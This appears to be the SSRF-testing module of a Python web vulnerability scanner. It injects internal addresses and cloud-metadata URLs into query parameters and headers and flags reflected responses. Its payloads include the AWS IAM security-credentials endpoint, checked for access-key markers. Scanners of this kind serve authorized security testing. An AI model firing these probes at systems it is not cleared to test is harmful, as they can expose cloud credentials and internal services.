import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urljoin, quote

from core.config import Config
from core.utils import (
    print_info, print_good, print_warning, print_error, print_vuln,
    print_phase, get_session, normalize_url, _capture_command_output,
)
from lib.payloads import Payloads
import logging


class SSRFModule:
    def __init__(self, scanner):
        self.scanner = scanner
        self.config = scanner.config
        self.payloads = Payloads()

    def test_ssrf_url_params(self, url, param, session):
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        if param not in params:
            return []

        findings = []
        ssrf_targets = self.payloads.SSRF_INTERNAL_TARGETS
        probes = self.payloads.SSRF_PROBES

        for target_url in ssrf_targets:
            params[param] = [target_url]
            new_query = urlencode(params, doseq=True)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

            try:
                resp = session.get(test_url, timeout=self.config.timeout,
                                   verify=self.config.verify_tls, allow_redirects=False)
                body = resp.text or ""

                for probe_url, indicators in probes:
                    if target_url.rstrip("/") in probe_url or probe_url.rstrip("/") in target_url:
                        for indicator in indicators:
                            if indicator.lower() in body.lower():
                                finding = {
                                    "type": "ssrf",
                                    "severity": "critical",
                                    "url": url,
                                    "param": param,
                                    "payload": target_url,
                                    "evidence": indicator,
                                    "response_length": len(body),
                                }
                                findings.append(finding)
                                print_vuln(
                                    f"SSRF via param '{param}': "
                                    f"reflected internal response at {test_url}"
                                )
                                break
                        break

                if resp.status_code in (301, 302, 303, 307, 308):
                    location = resp.headers.get("Location", "")
                    if any(internal in location for internal in ["169.254", "127.0.0.1", "localhost", "metadata.google"]):
                        finding = {
                            "type": "ssrf_redirect",
                            "severity": "high",
                            "url": url,
                            "param": param,
                            "payload": target_url,
                            "redirect_to": location,
                        }
                        findings.append(finding)
                        print_vuln(
                            f"SSRF redirect via param '{param}': "
                            f"redirected to internal URL {location}"
                        )

            except Exception:
                logging.exception("ssrf.py: exception", exc_info=True)
                continue
        return findings

    def test_ssrf_headers(self, url, session):
        findings = []
        ssrf_headers = self.payloads.SSRF_HEADERS
        probe_markers = ["ami-id", "instance-id", "root:", "computemetadata"]

        for header_name in ssrf_headers:
            for probe_url, indicators in self.payloads.SSRF_PROBES:
                headers = {header_name: probe_url}
                try:
                    resp = session.get(url, headers=headers,
                                       timeout=self.config.timeout,
                                       verify=self.config.verify_tls,
                                       allow_redirects=False)
                    body = resp.text or ""

                    for indicator in indicators:
                        if indicator.lower() in body.lower():
                            finding = {
                                "type": "ssrf_header",
                                "severity": "critical",
                                "url": url,
                                "header": header_name,
                                "payload": probe_url,
                                "evidence": indicator,
                            }
                            findings.append(finding)
                            print_vuln(
                                f"SSRF via header '{header_name}': "
                                f"reflected internal response at {url}"
                            )
                            break
                    else:
                        continue
                    break
                except Exception:
                    logging.exception("ssrf.py: exception", exc_info=True)
                    continue
        for header_name in ssrf_headers:
            evil = f"http://127.0.0.1:{__import__('random').randint(10000, 60000)}/"
            headers = {header_name: evil}
            try:
                resp = session.get(url, headers=headers,
                                   timeout=3,
                                   allow_redirects=False)
                if resp.status_code == 502 or "502" in resp.text:
                    finding = {
                        "type": "ssrf_header_502",
                        "severity": "medium",
                        "url": url,
                        "header": header_name,
                        "payload": evil,
                        "evidence": "502 Bad Gateway - server attempted connection",
                    }
                    findings.append(finding)
                    print_warning(
                        f"Possible SSRF via '{header_name}': "
                        f"got 502 Bad Gateway connecting to {evil}"
                    )
            except Exception:
                logging.exception("ssrf.py: exception", exc_info=True)
                continue
        return findings

    def test_ssrf_metadata(self, session):
        findings = []
        target = self.config.target_url
        parsed = urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}"

        cloud_metadata_endpoints = [
            ("http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id", "local-hostname"]),
            ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", ["AccessKeyId", "SecretAccessKey"]),
            ("http://metadata.google.internal/computeMetadata/v1/", ["instance", "project"]),
            ("http://100.100.100.200/latest/meta-data/", ["ami-id", "instance-id"]),
        ]

        params_to_check = self.payloads.SSRF_URL_PARAMS

        for param in params_to_check:
            for metadata_url, indicators in cloud_metadata_endpoints:
                parsed_q = urlparse(target)
                params = parse_qs(parsed_q.query, keep_blank_values=True)
                params[param] = [metadata_url]
                new_query = urlencode(params, doseq=True)
                test_url = f"{parsed_q.scheme}://{parsed_q.netloc}{parsed_q.path}?{new_query}"

                try:
                    resp = session.get(test_url, timeout=5, allow_redirects=False)
                    body = resp.text or ""
                    for indicator in indicators:
                        if indicator.lower() in body.lower():
                            finding = {
                                "type": "ssrf_metadata",
                                "severity": "critical",
                                "url": target,
                                "param": param,
                                "metadata_endpoint": metadata_url,
                                "evidence": indicator,
                            }
                            findings.append(finding)
                            print_vuln(
                                f"SSRF cloud metadata access via '{param}': "
                                f"reached {metadata_url}"
                            )
                            break
                except Exception:
                    logging.exception("ssrf.py: exception", exc_info=True)
                    continue
        return findings

    def run(self, target, session=None):
        print_phase("SSRF Testing")
        self.config.target_url = normalize_url(target)

        if session is None:
            session = get_session()
        if session is None:
            print_error("Cannot proceed without a valid HTTP session.")
            return

        all_findings = []

        parsed = urlparse(target)
        params = parse_qs(parsed.query, keep_blank_values=True)

        if params:
            print_info(f"Testing {len(params)} URL parameters for SSRF...")
            for param in params:
                print_info(f"  Testing parameter: {param}")
                findings = self.test_ssrf_url_params(target, param, session)
                all_findings.extend(findings)
        else:
            print_info("No URL parameters found, skipping URL param SSRF tests.")

        print_info("Testing HTTP headers for SSRF...")
        header_findings = self.test_ssrf_headers(target, session)
        all_findings.extend(header_findings)

        print_info("Testing cloud metadata endpoints...")
        metadata_findings = self.test_ssrf_metadata(session)
        all_findings.extend(metadata_findings)

        self.config.scan_data["vulnerabilities"]["ssrf"] = all_findings
        for f in all_findings:
            if f not in self.config.findings:
                self.config.findings.append(f)

        if all_findings:
            print_good(f"SSRF testing complete: {len(all_findings)} potential issue(s) found.")
        else:
            print_info("SSRF testing complete: no vulnerabilities found.")
